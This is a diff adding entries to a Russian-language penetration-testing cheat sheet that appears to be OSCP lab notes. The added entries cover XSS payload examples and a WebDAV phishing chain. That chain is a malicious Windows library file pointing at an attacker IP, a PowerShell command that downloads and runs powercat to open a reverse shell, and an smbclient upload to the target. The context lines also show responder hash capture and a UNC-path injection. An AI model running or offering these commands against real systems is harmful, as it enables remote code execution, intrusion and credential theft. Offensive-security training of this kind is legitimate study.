@@ -181,6 +181,12 @@ echo -n 'Get-Process' | iconv -t UTF-16LE | base64 -w 0
 exiftool file.pdf	метаданные о pdf файле
 
 ================XSS/CSRF
+Reflected XSS - сохраненная в ссылке
+	https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+	<p>Status: <script>/* Bad stuff here... */</script></p>
+Stored XSS - сохраненная на сайте, пользователь увидит, зайдя на зараженную страницу
+	сохраненный скрипт <script>payload</script> в сообщении на странице форума
+DOM XSS
 стащить куки, выпонить код в браузере жертвы, получить куки, nonce
 ключевые символы: < > ' " { } ;
 	1. Между тегами:	<div>ТВОЙ_ВВОД</div>		<--	<script>alert(1)</script>
@@ -323,6 +329,34 @@ sudo responder -I tun0
 	tap0 берется из вывода ip a
 dir \\192.168.119.2\test
 	подключение к samba из windows (для responder SMB), подключение для перехвата хеша, наличие реальной директории test не нужно
+
+==========WebDAV
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/user/re/oscp/labs/webdav
+	запустить WebDAV папку, там находится файл config.Library-ms
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.170</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.170:80/powercat.ps1');powercat -c 192.168.45.170 -p 4444 -e powershell"
+	созданная ссылка в папке WevDAV (по вызову из меню new->shortcut)
+smbclient //192.168.222.195/share -c 'put config.Library-ms'
+	копируем созданный ярлык в папку WebDAV через самбу, 192.168.222.195 - IP адрес атакуемой машины
 
 ==========BURP
 filename="\\\\192.168.45.232\\share\\test.txt"
